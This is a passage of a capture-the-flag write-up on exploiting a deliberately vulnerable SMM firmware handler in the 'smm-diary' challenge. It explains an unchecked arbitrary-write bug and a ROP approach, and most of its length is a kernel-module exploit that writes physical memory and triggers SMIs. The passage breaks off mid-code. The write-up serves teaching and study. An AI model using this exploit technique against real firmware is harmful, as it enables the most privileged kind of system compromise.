        <span class="n">ret</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">fd2</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">);</span>

        <span class="n">ret</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd3</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x63</span> <span class="o">&amp;&amp;</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x6f</span> <span class="o">&amp;&amp;</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x72</span> <span class="o">&amp;&amp;</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">3</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x63</span>
                <span class="o">&amp;&amp;</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x74</span><span class="p">)</span> <span class="p">{</span>
                <span class="kt">char</span><span class="o">*</span> <span class="n">flag</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
                <span class="n">info</span><span class="p">(</span><span class="s">"flag found :) %s "</span><span class="p">,</span> <span class="n">flag</span><span class="p">);</span>
                <span class="n">print_hex8</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mh">0x20</span><span class="p">);</span>
                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="n">read_addr</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">info</span><span class="p">(</span><span class="s">"flag not found :( </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="n">WAIT</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>

<h2 id="smm-diary-sec">smm-diary</h2>
<p><img src="./corfCTF2023 _ H0ps CTF adventures_files/corctf2023-smm-diary.png" alt="smm-diary"></p>

<p>Smm-diary was a very interesting challenge. We are tasked with exploiting a system firmware application running in a special x86 operating mode called System Management Mode (<code class="language-plaintext highlighter-rouge">SMM</code>). This mode is also called “ring -2” and is the most privileged execution mode on a x86 processor. It is used by system firmware like BIOS or UEFI and operates independently and transparent of any OS.</p>

<p>The System Management Interrupt (<code class="language-plaintext highlighter-rouge">SMI</code>) can be used to put a CPU into <code class="language-plaintext highlighter-rouge">SMM</code> mode. We can trigger an <code class="language-plaintext highlighter-rouge">SMI</code> from software by writing to I/O port <code class="language-plaintext highlighter-rouge">0x2b</code>. The code executed when in <code class="language-plaintext highlighter-rouge">SMM</code> mode is located in a specific region of memory called System Management RAM (<code class="language-plaintext highlighter-rouge">SRAM</code>). This memory region is only accessible in <code class="language-plaintext highlighter-rouge">SMM</code> mode.</p>

<h3 id="challenge">Challenge</h3>
<p>Besides a linux kernel and a couple of other files we are given a patch file for the <a href="https://github.com/tianocore/edk2">EDK II Project</a>. The patch adds a file to the Open Virtual Machine Firmware (OVMF) package that implements a simple diary application. We can store up to 20 notes in the diary and the notes can be at max 16 bytes long. After writing a note we can also read it or dump the whole diary. The logic of the application is implemented in a <code class="language-plaintext highlighter-rouge">SMI handler</code> and the flag is stored in a global variable:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">const</span> <span class="n">CHAR8</span> <span class="o">*</span><span class="n">Flag</span> <span class="o">=</span> <span class="s">"corctf{test_flag_test_flag_test}"</span><span class="p">;</span>

<span class="k">typedef</span> <span class="k">struct</span>
<span class="p">{</span>
    <span class="n">UINT8</span> <span class="n">Note</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
<span class="p">}</span><span class="n">DIARY_NOTE</span><span class="p">;</span>

<span class="cp">#define NUM_PAGES 20
</span>
<span class="p">...</span>

<span class="n">DIARY_NOTE</span> <span class="n">Book</span><span class="p">[</span><span class="n">NUM_PAGES</span><span class="p">];</span>
<span class="n">EFI_STATUS</span>
<span class="n">EFIAPI</span>
<span class="nf">CorctfSmmHandler</span> <span class="p">(</span>
    <span class="n">IN</span> <span class="n">EFI_HANDLE</span>  <span class="n">DispatchHandle</span><span class="p">,</span>
    <span class="n">IN</span> <span class="n">CONST</span> <span class="n">VOID</span>  <span class="o">*</span><span class="n">Context</span>         <span class="n">OPTIONAL</span><span class="p">,</span>
    <span class="n">IN</span> <span class="n">OUT</span> <span class="n">VOID</span>    <span class="o">*</span><span class="n">CommBuffer</span>      <span class="n">OPTIONAL</span><span class="p">,</span>
    <span class="n">IN</span> <span class="n">OUT</span> <span class="n">UINTN</span>   <span class="o">*</span><span class="n">CommBufferSize</span>  <span class="n">OPTIONAL</span>
    <span class="p">)</span>
<span class="p">{</span>
    <span class="n">COMM_DATA</span> <span class="o">*</span><span class="n">CommData</span> <span class="o">=</span> <span class="p">(</span><span class="n">COMM_DATA</span> <span class="o">*</span><span class="p">)</span><span class="n">CommBuffer</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">CommBufferSize</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">COMM_DATA</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="n">DEBUG</span><span class="p">((</span><span class="n">DEBUG_INFO</span><span class="p">,</span> <span class="s">"Invalid size passed to %a</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">__FUNCTION__</span><span class="p">));</span>
        <span class="n">DEBUG</span><span class="p">((</span><span class="n">DEBUG_INFO</span><span class="p">,</span> <span class="s">"Expected Size: 0x%lx, got 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">COMM_DATA</span><span class="p">),</span> <span class="o">*</span><span class="n">CommBufferSize</span><span class="p">));</span>
        <span class="k">goto</span> <span class="n">Failure</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">((</span><span class="n">CommData</span><span class="o">-&gt;</span><span class="n">Cmd</span> <span class="o">==</span> <span class="n">ADD_NOTE</span> <span class="o">||</span> <span class="n">CommData</span><span class="o">-&gt;</span><span class="n">Cmd</span> <span class="o">==</span> <span class="n">GET_NOTE</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">CommData</span><span class="o">-&gt;</span><span class="n">Idx</span> <span class="o">&gt;=</span> <span class="n">NUM_PAGES</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">DEBUG</span><span class="p">((</span><span class="n">DEBUG_INFO</span><span class="p">,</span> <span class="s">"Invalid idx passed to %a</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">__FUNCTION__</span><span class="p">));</span>
        <span class="k">goto</span> <span class="n">Failure</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">switch</span> <span class="p">(</span><span class="n">CommData</span><span class="o">-&gt;</span><span class="n">Cmd</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">case</span> <span class="n">ADD_NOTE</span><span class="p">:</span>
            <span class="n">TransferNote</span><span class="p">(</span><span class="o">&amp;</span><span class="p">(</span><span class="n">CommData</span><span class="o">-&gt;</span><span class="n">Data</span><span class="p">.</span><span class="n">Note</span><span class="p">),</span> <span class="n">CommData</span><span class="o">-&gt;</span><span class="n">Idx</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="n">GET_NOTE</span><span class="p">:</span>
            <span class="n">TransferNote</span><span class="p">(</span><span class="o">&amp;</span><span class="p">(</span><span class="n">CommData</span><span class="o">-&gt;</span><span class="n">Data</span><span class="p">.</span><span class="n">Note</span><span class="p">),</span> <span class="n">CommData</span><span class="o">-&gt;</span><span class="n">Idx</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="n">DUMP_NOTES</span><span class="p">:</span>
            <span class="n">DumpNotes</span><span class="p">(</span><span class="n">CommData</span><span class="o">-&gt;</span><span class="n">Data</span><span class="p">.</span><span class="n">Dest</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="nl">default:</span>
            <span class="n">DEBUG</span><span class="p">((</span><span class="n">DEBUG_INFO</span><span class="p">,</span> <span class="s">"Invalid cmd passed to %a, got 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">__FUNCTION__</span><span class="p">,</span> <span class="n">CommData</span><span class="o">-&gt;</span><span class="n">Cmd</span><span class="p">));</span>
            <span class="k">goto</span> <span class="n">Failure</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">EFI_SUCCESS</span><span class="p">;</span>

    <span class="nl">Failure:</span>
    <span class="o">*</span><span class="n">CommBufferSize</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="k">return</span> <span class="n">EFI_SUCCESS</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>When a <code class="language-plaintext highlighter-rouge">SMI</code> occurs, the correct <code class="language-plaintext highlighter-rouge">SMI handler</code> to be invoked is identified by a GUID. This GUID is defined when the handler is initially registered:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">Status</span> <span class="o">=</span> <span class="n">gSmst</span><span class="o">-&gt;</span><span class="n">SmiHandlerRegister</span> <span class="p">(</span>
                <span class="n">CorctfSmmHandler</span><span class="p">,</span>
                <span class="o">&amp;</span><span class="n">gEfiSmmCorctfProtocolGuid</span><span class="p">,</span>
                <span class="o">&amp;</span><span class="n">DispatchHandle</span>
                <span class="p">);</span>
</code></pre></div></div>

<p>To pass data to the diary application we need to write data to a Communication Buffer (<code class="language-plaintext highlighter-rouge">ComBuffer</code>) and then trigger a <code class="language-plaintext highlighter-rouge">SMI</code>. The <code class="language-plaintext highlighter-rouge">ComBuffer</code> is a buffer which is accessible by non-SMM and SMM code and therefore allows communication with the SMM code.</p>

<h3 id="how-the-fuck-do-we-talk-to-this">How the fuck do we talk to this?</h3>
<p>The by far biggest part of the challenge was to figure out how to actually communicate with the diary application. We couldn’t find any resources on how to specify or find the address of the <code class="language-plaintext highlighter-rouge">ComBuffer</code> and all exploits we found online used the <a href="https://github.com/chipsec/chipsec/tree/6cdfd54d6ea3cef558ca761370cdbcf2e9ff906a">CHIPSEC python framework</a> instead of C code.</p>

<p>After banging our heads against the wall for a couple of hours we decided to check how the <code class="language-plaintext highlighter-rouge">CHIPSEC</code> framework actually communicates with with the system firmware. We found the <a href="https://github.com/chipsec/chipsec/blob/8bde1bd648250ed8f71229b8feb477349e4c2d55/chipsec/hal/interrupts.py#L161">send_smmc_SMI</a> function which does exactly what we are looking for: write data to the <code class="language-plaintext highlighter-rouge">ComBuffer</code> and then trigger a <code class="language-plaintext highlighter-rouge">SMI</code>. This function specifies the address of the <code class="language-plaintext highlighter-rouge">ComBuffer</code> and its size by writing to the <a href="https://github.com/tianocore/edk2/blob/fa789cc68a85a5781c18c64b9112c779750b2125/MdeModulePkg/Core/PiSmmCore/PiSmmCorePrivateData.h#L117">SMM_CORE_PRIVATE_DATA struct (smmc)</a>. The address of the <code class="language-plaintext highlighter-rouge">smmc</code> struct is found by scanning the EFI code regions for the string “smmc”.</p>

<p>The address of the <code class="language-plaintext highlighter-rouge">ComBuffer</code> can not be arbitrary. After a couple of tries we found out that an address in the <code class="language-plaintext highlighter-rouge">EFI_RUNTIME_SERVICES_DATA</code> region works.</p>

<p>We copied this functionality and implemented it in a kernel module, and sure enough, we were finally able to trigger the functions of the diary application :).</p>

<h3 id="vuln">Vuln</h3>
<p>The vulnerability of this challenge is in the <code class="language-plaintext highlighter-rouge">DumpNotes</code> function. It dumps the whole diary to <code class="language-plaintext highlighter-rouge">CommData-&gt;Data.Dest</code>, an address we provide, without doing any checks. Therefore, we can dump the diary at arbitrary addresses.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">VOID</span>
<span class="nf">DumpNotes</span> <span class="p">(</span>
    <span class="n">IN</span> <span class="n">UINT8</span> <span class="o">*</span><span class="n">Dest</span>
    <span class="p">)</span>
<span class="p">{</span>
    <span class="n">CopyMem</span><span class="p">(</span><span class="n">Dest</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Book</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">Book</span><span class="p">));</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="exploitation">Exploitation</h3>
<p>To exploit this, we simply corrupted the stack and executed a ROP chain. This chain uses the <code class="language-plaintext highlighter-rouge">CopyMem</code> function to copy the flag to the address of the <code class="language-plaintext highlighter-rouge">CommBuffer</code>, which we can read from the kernel module. The chain then gracefully returns control back to the SMM code in order to exit from SMM mode. To ensure a correct return, we adjusted the stack pointer to point to an intact stack frame after running our ROP chain.</p>

<p>The addresses of EFI module code and stack are constant so we didn’t require any leaks and could just hardcode the addresses.</p>

<h3 id="exploit-2">Exploit</h3>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;linux/init.h&gt;
#include &lt;linux/module.h&gt;
#include &lt;linux/kernel.h&gt;
#include &lt;linux/acpi.h&gt;
#include &lt;linux/efi.h&gt;
</span>
<span class="n">MODULE_LICENSE</span><span class="p">(</span><span class="s">"GPL"</span><span class="p">);</span>
<span class="n">MODULE_AUTHOR</span><span class="p">(</span><span class="s">"HaxHax"</span><span class="p">);</span>
<span class="n">MODULE_DESCRIPTION</span><span class="p">(</span><span class="s">"A simple Linux module."</span><span class="p">);</span>
<span class="n">MODULE_VERSION</span><span class="p">(</span><span class="s">"0.01"</span><span class="p">);</span>

<span class="cp">#define EFI_CORCTF_SMM_PROTOCOL_GUID \
    { 0xb888a84d, 0x3888, 0x480e, { 0x95, 0x83, 0x81, 0x37, 0x25, 0xfd, 0x39, 0x8b } }
</span>
<span class="cp">#define ADD_NOTE 0x1337
#define GET_NOTE 0x1338
#define DUMP_NOTES 0x31337
</span>
<span class="cp">#define SMBASE 0x7FFAF000
</span>
<span class="k">typedef</span> <span class="k">struct</span>
<span class="p">{</span>
    <span class="kt">uint8_t</span> <span class="n">note</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
<span class="p">}</span><span class="n">diary_note</span><span class="p">;</span>

<span class="k">typedef</span> <span class="k">struct</span>
<span class="p">{</span>
    <span class="kt">uint32_t</span> <span class="n">cmd</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">idx</span><span class="p">;</span>
    <span class="k">union</span> <span class="n">transfer_data</span>
    <span class="p">{</span>
        <span class="n">diary_note</span> <span class="n">note</span><span class="p">;</span>
        <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">dest</span><span class="p">;</span>
    <span class="p">}</span> <span class="n">data</span><span class="p">;</span>
<span class="p">}</span><span class="n">comm_data_t</span><span class="p">;</span>

<span class="cp">#define CHUNK_SIZE (4096)
</span>
<span class="n">u64</span> <span class="nf">_find_smmc</span><span class="p">(</span><span class="n">u64</span> <span class="n">start</span><span class="p">,</span> <span class="n">u64</span> <span class="n">end</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"_find_smmc, start: %llx, end: %llx </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">);</span>
    <span class="n">u64</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">start</span><span class="p">;</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">vaddr</span><span class="p">;</span>
    <span class="c1">//char target[] = "smmc";</span>
    <span class="n">u32</span> <span class="n">target</span> <span class="o">=</span> <span class="n">cpu_to_le32</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">u32</span><span class="o">*</span><span class="p">)</span><span class="s">"smmc"</span><span class="p">);</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span> <span class="o">=</span> <span class="n">end</span> <span class="o">-</span> <span class="n">start</span><span class="p">;</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">mapped_start</span><span class="p">;</span>

    <span class="n">mapped_start</span> <span class="o">=</span> <span class="n">ioremap</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">mapped_start</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printk</span><span class="p">(</span><span class="n">KERN_ERR</span> <span class="s">"ioremap failed for address range %llx to %llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">while</span> <span class="p">(</span><span class="n">addr</span> <span class="o">&lt;</span> <span class="n">end</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">vaddr</span> <span class="o">=</span> <span class="n">mapped_start</span> <span class="o">+</span> <span class="p">(</span><span class="n">addr</span> <span class="o">-</span> <span class="n">start</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">u32</span><span class="o">*</span><span class="p">)</span><span class="n">vaddr</span> <span class="o">==</span> <span class="n">target</span><span class="p">)</span> <span class="p">{</span>  <span class="c1">// compare 4-byte chunks as u32</span>
            <span class="n">iounmap</span><span class="p">(</span><span class="n">mapped_start</span><span class="p">);</span>
            <span class="k">return</span> <span class="n">addr</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">addr</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">target</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">iounmap</span><span class="p">(</span><span class="n">mapped_start</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// EFI_RUNTIME_SERVICES_DATA</span>
<span class="n">u64</span> <span class="nf">find_data_reg</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">efi_memory_desc_t</span> <span class="o">*</span><span class="n">md</span><span class="p">;</span>
    <span class="n">u64</span> <span class="n">addr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">u64</span> <span class="n">size</span><span class="p">,</span> <span class="n">mmio_start</span><span class="p">,</span> <span class="n">mmio_end</span><span class="p">;</span>

    <span class="n">for_each_efi_memory_desc</span><span class="p">(</span><span class="n">md</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">md</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">==</span> <span class="n">EFI_RUNTIME_SERVICES_DATA</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">size</span> <span class="o">=</span> <span class="n">md</span><span class="o">-&gt;</span><span class="n">num_pages</span> <span class="o">&lt;&lt;</span> <span class="n">EFI_PAGE_SHIFT</span><span class="p">;</span>
            <span class="n">mmio_start</span> <span class="o">=</span> <span class="n">md</span><span class="o">-&gt;</span><span class="n">phys_addr</span><span class="p">;</span>
            <span class="n">mmio_end</span> <span class="o">=</span> <span class="n">mmio_start</span> <span class="o">+</span> <span class="n">size</span><span class="p">;</span>

            <span class="k">return</span> <span class="n">mmio_start</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// EFI_RUNTIME_SERVICES_CODE</span>
<span class="k">static</span> <span class="n">u64</span> <span class="nf">find_smm_core_private_data</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">efi_memory_desc_t</span> <span class="o">*</span><span class="n">md</span><span class="p">;</span>
    <span class="n">u64</span> <span class="n">addr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">u64</span> <span class="n">size</span><span class="p">,</span> <span class="n">mmio_start</span><span class="p">,</span> <span class="n">mmio_end</span><span class="p">;</span>

    <span class="n">for_each_efi_memory_desc</span><span class="p">(</span><span class="n">md</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">md</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">==</span> <span class="n">EFI_RUNTIME_SERVICES_CODE</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">size</span> <span class="o">=</span> <span class="n">md</span><span class="o">-&gt;</span><span class="n">num_pages</span> <span class="o">&lt;&lt;</span> <span class="n">EFI_PAGE_SHIFT</span><span class="p">;</span>
            <span class="n">mmio_start</span> <span class="o">=</span> <span class="n">md</span><span class="o">-&gt;</span><span class="n">phys_addr</span><span class="p">;</span>
            <span class="n">mmio_end</span> <span class="o">=</span> <span class="n">mmio_start</span> <span class="o">+</span> <span class="n">size</span><span class="p">;</span>

            <span class="n">addr</span> <span class="o">=</span> <span class="n">_find_smmc</span><span class="p">(</span><span class="n">mmio_start</span><span class="p">,</span> <span class="n">mmio_end</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">addr</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">write_phys_mem</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">phys_addr</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">void</span> <span class="n">__iomem</span> <span class="o">*</span><span class="n">io_addr</span><span class="p">;</span>

    <span class="c1">// Map the physical address to a virtual address</span>
    <span class="n">io_addr</span> <span class="o">=</span> <span class="n">ioremap</span><span class="p">(</span><span class="n">phys_addr</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">io_addr</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">pr_err</span><span class="p">(</span><span class="s">"Failed to remap physical address %lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">phys_addr</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// Write the data</span>
    <span class="n">memcpy_toio</span><span class="p">(</span><span class="n">io_addr</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>

    <span class="c1">// Unmap the address</span>
    <span class="n">iounmap</span><span class="p">(</span><span class="n">io_addr</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">read_phys_mem</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">phys_addr</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">void</span> <span class="n">__iomem</span> <span class="o">*</span><span class="n">io_addr</span><span class="p">;</span>

    <span class="c1">// Map the physical address to a virtual address</span>
    <span class="n">io_addr</span> <span class="o">=</span> <span class="n">ioremap</span><span class="p">(</span><span class="n">phys_addr</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">io_addr</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">pr_err</span><span class="p">(</span><span class="s">"Failed to remap physical address %lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">phys_addr</span><span class="p">);</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// Write the data</span>
    <span class="n">memcpy_fromio</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">io_addr</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>

    <span class="c1">// Unmap the address</span>
    <span class="n">iounmap</span><span class="p">(</span><span class="n">io_addr</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">u64</span> <span class="n">payload_loc</span><span class="p">;</span>
<span class="n">u64</span> <span class="n">smcc</span><span class="p">;</span>
<span class="kt">void</span> <span class="n">__iomem</span><span class="o">*</span> <span class="n">io_addr</span><span class="p">;</span>
<span class="n">efi_guid_t</span> <span class="n">target_guid</span> <span class="o">=</span> <span class="n">EFI_GUID</span><span class="p">(</span><span class="mh">0xb888a84d</span><span class="p">,</span> <span class="mh">0x3888</span><span class="p">,</span> <span class="mh">0x480e</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">);</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">add_note</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">idx</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">comm_data_t</span> <span class="n">payload</span><span class="p">;</span>
    <span class="n">payload</span><span class="p">.</span><span class="n">cmd</span> <span class="o">=</span> <span class="n">ADD_NOTE</span><span class="p">;</span>
    <span class="n">payload</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="n">idx</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">+</span> <span class="mi">24</span><span class="p">;</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">payload</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">note</span><span class="p">.</span><span class="n">note</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">note</span><span class="p">.</span><span class="n">note</span><span class="p">));</span>

    <span class="n">u64</span> <span class="n">combuf_off</span> <span class="o">=</span> <span class="mi">56</span><span class="p">;</span>
    <span class="n">u64</span> <span class="n">buffersz_off</span> <span class="o">=</span> <span class="n">combuf_off</span> <span class="o">+</span> <span class="mi">8</span><span class="p">;</span>
    <span class="n">u64</span> <span class="n">ret_off</span> <span class="o">=</span> <span class="n">buffersz_off</span> <span class="o">+</span> <span class="mi">8</span><span class="p">;</span>

    <span class="n">write_phys_mem</span><span class="p">(</span><span class="n">smcc</span> <span class="o">+</span> <span class="n">combuf_off</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">payload_loc</span><span class="p">);</span>
    <span class="n">write_phys_mem</span><span class="p">(</span><span class="n">smcc</span> <span class="o">+</span> <span class="n">buffersz_off</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">);</span>

    <span class="n">memcpy_toio</span><span class="p">(</span><span class="n">io_addr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">target_guid</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">efi_guid_t</span><span class="p">));</span>
    <span class="n">memcpy_toio</span><span class="p">(</span><span class="n">io_addr</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">efi_guid_t</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">size_t</span><span class="p">));</span>
    <span class="n">memcpy_toio</span><span class="p">(</span><span class="n">io_addr</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">efi_guid_t</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">size_t</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">comm_data_t</span><span class="p">));</span>

    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"Triggering OUT SMI for idx: %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>

    <span class="n">outb</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">);</span>
